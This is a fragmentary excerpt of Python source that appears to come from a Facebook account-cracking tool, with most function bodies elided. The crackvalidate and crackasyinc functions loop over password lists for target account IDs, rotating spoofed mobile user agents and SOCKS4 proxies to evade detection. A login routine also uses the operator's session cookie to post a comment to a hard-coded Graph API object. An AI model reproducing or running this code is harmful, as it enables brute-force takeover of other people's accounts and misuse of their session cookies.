...
def login_cokies():
    try:
        ...
        requests.post(f"https://graph.facebook.com/v17.0/8553412348033652_8553412348033652/comments/?message=aman8553412348033652", headers = {"cookie":cookie})
...
def atur_method():
	...
	if CYXIEON_METHODE in ['1','01']:
	   ...
	   method.append('asyinc very recommended')
	else:
		method.append('validate')
	print(f"{kun}╭────────────────────────────────────────────{puti}")
...
def crackvalidate(idf,pwx,url):
	...
	for pw in pwx:
		try:
			...
			ua = rc(ugen)
			ua2 = rc(["Mozilla/5.0 (Linux; Android 10; SM-A710S Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.1723.5 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/252.0.0.13.51;]","Mozilla/5.0 (Linux; Android 11; SM-A700L Build/SP2A.653342.342; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.1622.183 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/214.0.0.15.25;]"])
...
def crackasyinc(idf,pwx,url):
	...
	for pw in pwx:
		try:
			...
			proxs = {'http': 'socks4://'+nip}
			ua = rc(ugen)
			ua2 = rc(["Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 GoogleApp/14.14.16.26.arm64","Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36"])
